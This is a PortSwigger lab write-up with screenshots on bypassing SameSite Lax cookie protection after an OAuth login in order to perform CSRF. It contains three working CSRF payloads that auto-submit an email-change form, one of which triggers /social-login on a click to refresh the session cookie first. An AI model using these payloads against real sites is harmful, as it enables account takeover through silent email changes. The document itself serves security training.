![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/c04d96d3-feed-423f-bd25-006f67f35f0c)

### Solution

Log in using the given username and password, the page will take us to a social media page for loggin in.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/2482e5a6-79f4-4536-8b49-805767b1b066)

Submit a update email request with some random email id.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/b798d872-0088-4cb5-be04-872a8a091a71)

The email update POST request doesn't have any unpredictable tokens.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/0714bcb4-3d59-4fc2-85c5-e5274347b2db)

Use the following script in the body section of the exploit server for a basic CSRF attack

```js
<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>
```

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/d2739012-491e-4b77-9531-f23e07187221)

The email is changed to the one we gave

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/6c8a6927-d509-445c-872a-e0e9776a6598)

The `GET /oauth-callback?code=[...]` request at the end of the OAuth flow doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/07fb27fa-9b38-4c4d-87e8-99fc90b24979)

`/social-login` is the one that automatically initiates the full OAuth flow.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/b197feba-9e1c-46d0-8509-e472e410194c)

Use the following script in the body of the exploit server for causing an email change request.

```js
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hacker@web-security-academy.net">
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```
![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/992b2f5a-b54b-4bf0-8e68-bde229e20858)

The initial request is blocked as a popup.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/2b8b7b1a-3eb7-4814-bf09-d42c1199e103)

but csrf attack still worked

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/f92f4eb1-9703-4cef-89de-066e35217297)

The pop-up was blocked because there is no interaction with the page. Use the following script in the body of the exploit server which will enable an interaction with the webpage.

```js
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pranked@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```
Delivering the it to the victim will finish the lab and cause the CSRF attack

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/a277c3b7-a3cc-43c5-ab96-1894893ad306)

When inspecting the POST /my-account/change-email we can see a new session cookie has been created.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/64cddb8a-b867-4c56-a139-7056e54a15c7)

Deliver the exploit to the victim to solve the lab

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/cd501669-65dd-45e9-b7f3-7979151fc323)

lab solved succesully
